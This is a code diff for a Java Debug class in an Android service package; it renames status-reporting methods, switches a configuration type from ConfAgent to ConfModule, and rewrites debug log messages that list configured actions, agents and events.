@@ -13,7 +13,7 @@ import java.util.Iterator;
 import com.android.service.action.Action;
 import com.android.service.action.SubAction;
 import com.android.service.auto.Cfg;
-import com.android.service.conf.ConfAgent;
+import com.android.service.conf.ConfModule;
 import com.android.service.conf.ConfEvent;
 import com.android.service.conf.Globals;
 import com.android.service.util.Check;
@@ -42,7 +42,7 @@ public class Debug {
 	/**
 	 * Status actions.
 	 */
-	public static void StatusActions() {
+	public static void statusActions() {
 		final Status status = Status.self();
 
 		if (Cfg.DEBUG) {
@@ -54,14 +54,14 @@ public class Debug {
 				final Action a = status.getAction(i);
 
 				if (Cfg.DEBUG) {
-					Check.log(" Action Id: " + a.getId() + " sub num: " + a.getSubActionsNum()); //$NON-NLS-1$ //$NON-NLS-2$
+					Check.log(" Action (" + a.getId() + ") " + a.getDesc()); //$NON-NLS-1$ //$NON-NLS-2$
 				}
 
 				for (int j = 0; j < a.getSubActionsNum(); j++) {
 					final SubAction s = a.getSubAction(j);
 
 					if (Cfg.DEBUG) {
-						Check.log("  -> SubAction " + j + " Type: " + s.getType()); //$NON-NLS-1$ //$NON-NLS-2$ 
+						Check.log("  -> " + s); //$NON-NLS-1$ //$NON-NLS-2$ 
 					}
 				}
 			}
@@ -82,14 +82,14 @@ public class Debug {
 	/**
 	 * Status agents.
 	 */
-	public static void StatusAgents() {
+	public static void statusModules() {
 		final Status status = Status.self();
 
 		if (Cfg.DEBUG) {
 			Check.log(" Status Agents Begins"); //$NON-NLS-1$
 		}
 
-		HashMap<String, ConfAgent> agents = status.getAgentsMap();
+		HashMap<String, ConfModule> agents = status.getAgentsMap();
 		final Iterator<String> it = agents.keySet().iterator();
 
 		while (it.hasNext()) {
@@ -97,9 +97,9 @@ public class Debug {
 			if (Cfg.DEBUG) {
 				Check.asserts(key != null, "null type"); //$NON-NLS-1$
 			}
-			final ConfAgent conf = agents.get(key);
+			final ConfModule a = agents.get(key);
 			if (Cfg.DEBUG) {
-				Check.log(" Agent Type: " + conf.getType()); //$NON-NLS-1$ //$NON-NLS-2$
+				Check.log(" Agent " + a.getType() + " " + a); //$NON-NLS-1$ //$NON-NLS-2$
 			}
 
 		}
@@ -112,7 +112,7 @@ public class Debug {
 	/**
 	 * Status events.
 	 */
-	public static void StatusEvents() {
+	public static void statusEvents() {
 		final Status statusObj = Status.self();
 
 		if (Cfg.DEBUG) {
@@ -124,7 +124,7 @@ public class Debug {
 				final ConfEvent e = statusObj.getEvent(i);
 
 				if (Cfg.DEBUG) {
-					Check.log(" Event Id: " + e.getId() + " Event Type: " + e.getType()); //$NON-NLS-1$ //$NON-NLS-2$ 							
+					Check.log(" Event (" + e.getId() + ") " + e.getType() + " [" + e.desc+"] " + e); //$NON-NLS-1$ //$NON-NLS-2$ 							
 				}
 			} catch (final GeneralException rcse) {
 				// No need to print that this agent doesn't exist
@@ -139,7 +139,7 @@ public class Debug {
 	/**
 	 * Status options.
 	 */
-	public static void StatusGlobals() {
+	public static void statusGlobals() {
 		final Status status = Status.self();
 
 		if (Cfg.DEBUG) {
